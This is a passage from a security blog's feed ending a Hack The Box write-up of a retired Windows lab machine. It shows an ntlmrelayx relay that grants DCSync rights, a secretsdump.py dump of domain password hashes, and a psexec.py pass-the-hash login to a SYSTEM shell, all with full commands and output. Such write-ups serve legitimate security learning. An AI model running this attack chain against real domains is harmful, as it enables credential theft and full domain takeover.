+&lt;span class="code-line"&gt;[*] Running in relay mode to single host&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Setting up SMB Server&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Setting up HTTP Server&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Servers started, waiting for connections&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] HTTPD: Client requested path: /&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] HTTPD: Client requested path: /&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] HTTPD: Client requested path: /&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Authenticating against ldap://10.10.10.161 as \created_01 SUCCEED&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Enumerating relayed user&amp;#39;s privileges. This may take a while on large domains&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] HTTPD: Client requested path: /favicon.ico&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] HTTPD: Client requested path: /favicon.ico&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] HTTPD: Client requested path: /favicon.ico&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] User privileges found: Create user&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] User privileges found: Modifying domain ACL&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Querying domain security descriptor&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Success! User created_01 now has Replication-Get-Changes-All privileges on the domain&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Try using DCSync with secretsdump.py and this user :)&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Saved restore state to aclpwn-20191105-184250.restore&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Authenticating against ldap://10.10.10.161 as \created_01 SUCCEED&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Enumerating relayed user&amp;#39;s privileges. This may take a while on large domains&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Exception in HTTP request handler: [Errno 32] Broken pipe&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] [Errno 32] Broken pipe&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] User privileges found: Create user&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] User privileges found: Modifying domain ACL&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] ACL attack already performed. Refusing to continue&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="dcsync"&gt;DCSync&lt;/h2&gt;
+&lt;p&gt;Our right where sufficient to escalate to get the &lt;code&gt;Replication-Get-Changes-All&lt;/code&gt;
+privileges on the domain. As mention by &lt;code&gt;ntlmrelayx&lt;/code&gt; we can now use a
+&lt;a href="https://adsecurity.org/?p=1729"&gt;DCSync&lt;/a&gt; attack on the domain using
+&lt;a href="https://github.com/SecureAuthCorp/impacket/"&gt;impacket's secretdump.py&lt;/a&gt; to get
+the users' passwords hashes.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python secretsdump.py &amp;#39;htb.local/created_01:M&amp;lt;redacted&amp;gt;@10.10.10.161&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Using the DRSUAPI method to get NTDS.DIT secrets&lt;/span&gt;
+&lt;span class="code-line"&gt;htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::&lt;/span&gt;
+&lt;span class="code-line"&gt;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::&lt;/span&gt;
+&lt;span class="code-line"&gt;DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="pth"&gt;PTH&lt;/h2&gt;
+&lt;p&gt;We can then use the &lt;a href="http://blog.gentilkiwi.com/tag/pass-the-hash"&gt;Path the hash&lt;/a&gt;
+technique with
+&lt;a href="https://github.com/SecureAuthCorp/impacket/"&gt;impacket's psexec.py&lt;/a&gt; to login on
+the Domain Controller as administrator and get the flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python psexec.py htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6&lt;/span&gt;
+&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Requesting shares on 10.10.10.161.....&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Found writable share ADMIN$&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Uploading file LgnQUJxD.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Opening SVCManager on 10.10.10.161.....&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Creating service evKq on 10.10.10.161.....&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Starting service evKq.....&lt;/span&gt;
+&lt;span class="code-line"&gt;[!] Press help for extra shell commands&lt;/span&gt;
+&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.14393]&lt;/span&gt;
+&lt;span class="code-line"&gt;(c) 2016 Mirosoft Corporation. All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Windows\system32&amp;gt;cd ..&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Windows&amp;gt;cd ..&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\&amp;gt;cd Users&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Users&amp;gt;cd Administrator&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Users\Administrator&amp;gt;cd Desktop&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Users\Administrator\Desktop&amp;gt;type root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;f04815&amp;lt;redacted&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;What a journey. This box was classified as easy but probably needed a medium
+classification. WinRM is so &lt;em&gt;finicky&lt;/em&gt;. The root part was interesting as it
+allowed us to play with Bloodhound and ntlmrelayx which doesn't happen a lot
+outside of client environments.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="windows"></category><category term="winrm"></category><category term="PTH"></category><category term="bloodhound"></category><category term="impacket"></category></entry><entry><title>HTB: Postman</title><link href="https://maggick.fr/2020/03/htb-postman.html" rel="alternate"></link><published>2020-03-15T09:30:00+01:00</published><updated>2020-03-15T09:30:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-03-15:/2020/03/htb-postman.html</id><summary type="html">&lt;p&gt;&lt;img alt="Postman Card" class="align-left" src="/media/2020.03/postman_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This box is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/215"&gt;Postman&lt;/a&gt; publish on
 Novemer the second 2019 by
